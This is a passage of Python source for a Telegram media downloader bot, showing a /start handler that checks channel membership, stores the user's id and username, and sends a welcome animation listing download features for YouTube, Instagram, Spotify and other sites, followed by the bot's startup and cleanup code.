                        "**• Download Facebook videos**\n"
                        "**• Download Instagram reels, story, highlights, post**\n"
                        "**• Download Twitter/X videos**\n"
                        "**• Download Spotify songs**\n"
                        "**• Download Pinterest images & videos**\n"
                        "**• Get artist's top tracks**\n\n"
                        "🎯 **How to Use:**\n"
                        "**▫️ /audio [YouTube URL] - Download audio from a video URL**\n"
                        "**▫️ /audio [song name] - Search and download audio by name**\n"
                        "**▫️ Use /spotify <song name> to download music**\n"
                        "**▫️ Use /sptfylist <artist name> for top tracks**\n"
                        "**▫️ /clear - Clear your active downloads if they're stuck**\n"
                        "**🫥 This Bot Works For Group Too \n**"
                        "**✨ Join our channel for updates and support!**"
                    )
                    await callback_query.message.reply_animation(
                        animation="https://cdn.glitch.global/35a512a0-3e86-48fe-9399-09a76ad9a594/89811-615423284_medium.mp4?v=1736421176653",
                        caption=welcome_text,
                        reply_markup=self.get_welcome_keyboard()
                    )
                else:
                    await callback_query.answer(
                        "❌ You haven't joined the channel yet. Please join first!",
                        show_alert=True
                    )

        @self.app.on_message(filters.command("start"))
        async def start_handler(client, message):
            is_member = await self.check_membership(client, message.from_user.id)
            if not is_member:
                await self.send_membership_message(message)
                return
            
            await self.logger.log_bot_start(
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name
            )

            # Store user data
            await self.store_user(
                message.from_user.id,
                message.from_user.username or "No username"
            )
            # Send welcome GIF with message
            welcome_text = (
                        "🎉 **𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐔𝐥𝐭𝐢𝐦𝐚𝐭𝐞 𝐌𝐞𝐝𝐢𝐚 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐁𝐨𝐭!**\n\n"
                        "**I can help you download your favorite content:**\n\n"
                        "📥 **Features:**\n"
                        "**• Download YouTube videos & shorts**\n"
                        "**• Download Facebook videos**\n"
                        "**• Download Instagram reels, story, highlights, post**\n"
                        "**• Download Twitter/X videos**\n"
                        "**• Download Spotify songs**\n"
                        "**• Download Pinterest images & videos**\n"
                        "**• Get artist's top tracks**\n\n"
                        "🎯 **How to Use:**\n"
                        "**▫️ /audio [YouTube URL] - Download audio from a video URL**\n"
                        "**▫️ /audio [song name] - Search and download audio by name**\n"
                        "**▫️ Use /spotify <song name> to download music**\n"
                        "**▫️ Use /sptfylist <artist name> for top tracks**\n"
                        "**▫️ /clear - Clear your active downloads if they're stuck**\n"
                        "**🫥 This Bot Works For Group Too \n**"
                        "**✨ Join our channel for updates and support!**"
                    )
            try:
                await message.reply_animation(
                    animation="https://cdn.glitch.global/35a512a0-3e86-48fe-9399-09a76ad9a594/89811-615423284_medium.mp4?v=1736421176653",
                    caption=welcome_text,
                    reply_markup=self.get_welcome_keyboard()
                )
            except Exception as e:
                # Fallback to regular message if animation fails
                logger.error(f"Error sending welcome animation: {e}")
                await message.reply_text(
                    welcome_text,
                    reply_markup=self.get_welcome_keyboard()
                )

        # Initialize aiohttp session and start the bot
        loop = asyncio.get_event_loop()
        loop.create_task(self.initialize())
        
        try:
            self.app.run()
        finally:
            loop.run_until_complete(self.cleanup())
            self.cleanup_temp_directory()

if __name__ == "__main__":
    bot = CombinedDownloaderBot()
    bot.start()
